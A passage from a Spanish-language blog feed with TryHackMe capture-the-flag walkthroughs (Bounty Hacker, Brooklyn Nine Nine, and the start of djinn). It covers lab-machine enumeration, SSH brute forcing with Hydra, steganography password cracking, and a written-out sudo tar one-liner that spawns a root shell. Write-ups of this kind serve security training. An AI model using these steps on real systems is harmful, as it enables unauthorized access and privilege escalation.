&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/bountyhacker# gobuster dir -u http://bountyhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;lin---user&#34;&gt;LIN - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos el usuario y el &amp;ldquo;wordlist&amp;rdquo; que encontramos en el puerto 21 con Hydra en el puerto 22 de SSH, donde logramos encontrar la contraseña para este usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bountyhacker/Screenshot_20200801_093526.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bountyhacker/Screenshot_20200801_093740.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;tar&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/tar/&#34;&gt;&lt;code&gt;tar&lt;/code&gt;&lt;/a&gt; para obtener una shell root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bountyhacker/Screenshot_20200801_093858.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo tar -cf /dev/null /dev/null --checkpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; --checkpoint-action&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos una shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bountyhacker/Screenshot_20200801_094000.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/bountyhacker/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/bountyhacker/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Brooklyn Nine Nine</title>
        <link>https://sckull.github.io/posts/brooklyn99/</link>
        <pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 29 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/brooklyn99/</guid>
        <description>Brooklyn Nine Nine es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Brooklyn Nine Nine es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/brooklyn99/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Brooklyn Nine Nine&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;110&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Fsociety2006&#34;&gt;Fsociety2006&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Jul 29 16:46:49 2020 as: nmap -sV -o nmap_scan_mini brooklyn.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; brooklyn.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.125.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul 29 16:47:33 2020 -- 1 IP address (1 host up) scanned in 43.91 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ingresamos en el servicio FTP con las credenciales de anonymous (&lt;code&gt;anonymous:anonymous&lt;/code&gt;) donde encontramos una nota, además dos posibles nombres de usuario &lt;code&gt;Amy&lt;/code&gt; y &lt;code&gt;Jake&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/brooklyn# ftp brooklyn.thm 
Connected to brooklyn.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;brooklyn.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;119&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 23:17 note_to_jake.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; note_to_jake.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;119&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;119&lt;/span&gt; bytes received in 0.01 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;12.3510 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@upset:~/thm/brooklyn# cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; someone hacks into the nine nine

root@upset:~/thm/brooklyn#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/brooklyn99/Screenshot_20200729_155010.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo fuente de la pagina encontramos un comentario que habla sobre &lt;code&gt;esteganografia&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- Have you ever heard of steganography? --&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;code&gt;STEGCRACKER&lt;/code&gt; para hacer un ataque de contraseñas a la imagen. Encontramos la contraseña y un archivo que contiene una contraseña, además un posible usuario &lt;code&gt;Holt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/brooklyn# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
StegCracker 2.0.9 - &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/Paradoxis/StegCracker&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; - Luke Paris &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Paradoxis&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Counting lines in wordlist..
Attacking file &lt;span class=&#34;s1&#34;&gt;&amp;#39;brooklyn99.jpg&amp;#39;&lt;/span&gt; with wordlist &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/share/wordlists/rockyou.txt&amp;#39;&lt;/span&gt;..
Successfully cracked file with password: admin
Tried &lt;span class=&#34;m&#34;&gt;20587&lt;/span&gt; passwords
Your file has been written to: brooklyn99.jpg.out
admin
root@upset:~/thm/brooklyn# cat brooklyn99.jpg.out 
Holts Password:
fluf&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;nenine

Enjoy!!
root@upset:~/thm/brooklyn#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/brooklyn# gobuster dir -u http://brooklyn.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;holt---user&#34;&gt;HOLT - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos la contraseña con los usuarios que encontramos y logramos obtener una shell con el usuario &lt;code&gt;holt&lt;/code&gt;, y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/brooklyn99/Screenshot_20200729_161245.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;nano&lt;/code&gt;. Utilizamos env para obtener una shell root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/brooklyn99/Screenshot_20200729_161501.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/&#34;&gt;&lt;strong&gt;GFOBINS - NANO&lt;/strong&gt;&lt;/a&gt; para obtener una shell con el usuario &lt;code&gt;root&lt;/code&gt; y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/brooklyn99/Screenshot_20200729_161721.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/brooklyn99/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/brooklyn99/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - djinn</title>
        <link>https://sckull.github.io/posts/djinn/</link>
        <pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 29 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/djinn/</guid>
        <description>djinn es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;djinn es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/djinn/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;djinn&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Intermediate level vulnerable box.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Medio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/falconfeast&#34;&gt;falconfeast&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
